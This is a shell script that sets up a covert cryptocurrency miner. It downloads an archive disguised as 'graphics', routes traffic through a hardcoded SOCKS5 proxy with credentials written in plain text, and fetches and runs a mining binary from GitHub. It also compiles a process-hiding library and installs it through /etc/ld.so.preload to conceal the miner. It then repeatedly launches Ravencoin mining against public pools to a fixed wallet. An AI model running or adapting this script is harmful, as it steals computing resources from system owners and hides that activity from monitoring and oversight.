ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 45.155.69.201:6406
socks5_username = ingfoingfo
socks5_password = maszZeehh
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo " "

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo " "

echo " "
echo " "

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
chmod +x bezzHash

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
unzip magicBezzHash.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp ./bezzHash --url=stratum+tcp://RXK7bh1VdavfDxJXBwEkcZPVTEqsvCCC2g.$(echo $(shuf -i 1-99999 -n 1)-T4)@us-rvn.2miners.com:6060 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99

./graftcp/graftcp ./bezzHash --url=stratum+tcp://RXK7bh1VdavfDxJXBwEkcZPVTEqsvCCC2g.$(echo $(shuf -i 1-99999 -n 1)-T4)@rvn.2miners.com:6060 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99

./graftcp/graftcp ./bezzHash --url=stratum+tcp://RXK7bh1VdavfDxJXBwEkcZPVTEqsvCCC2g.$(echo $(shuf -i 1-99999 -n 1)-T4)@us-rvn.2miners.com:6060 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99

./graftcp/graftcp ./bezzHash --url=stratum+tcp://RXK7bh1VdavfDxJXBwEkcZPVTEqsvCCC2g.$(echo $(shuf -i 1-99999 -n 1)-T4)@rvn.2miners.com:6060 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99

./graftcp/graftcp ./bezzHash --url=stratum+tcp://RXK7bh1VdavfDxJXBwEkcZPVTEqsvCCC2g.$(echo $(shuf -i 1-99999 -n 1)-T4)@us-rvn.2miners.com:6060 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99

./graftcp/graftcp ./bezzHash --url=stratum+tcp://RXK7bh1VdavfDxJXBwEkcZPVTEqsvCCC2g.$(echo $(shuf -i 1-99999 -n 1)-T4)@rvn.2miners.com:6060 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99

./graftcp/graftcp ./bezzHash --url=stratum+tcp://RXK7bh1VdavfDxJXBwEkcZPVTEqsvCCC2g.$(echo $(shuf -i 1-99999 -n 1)-T4)@us-rvn.2miners.com:6060 --ocX 

./graftcp/graftcp ./bezzHash --url=stratum+tcp://RXK7bh1VdavfDxJXBwEkcZPVTEqsvCCC2g.$(echo $(shuf -i 1-99999 -n 1)-T4)@rvn.2miners.com:6060 --ocX 
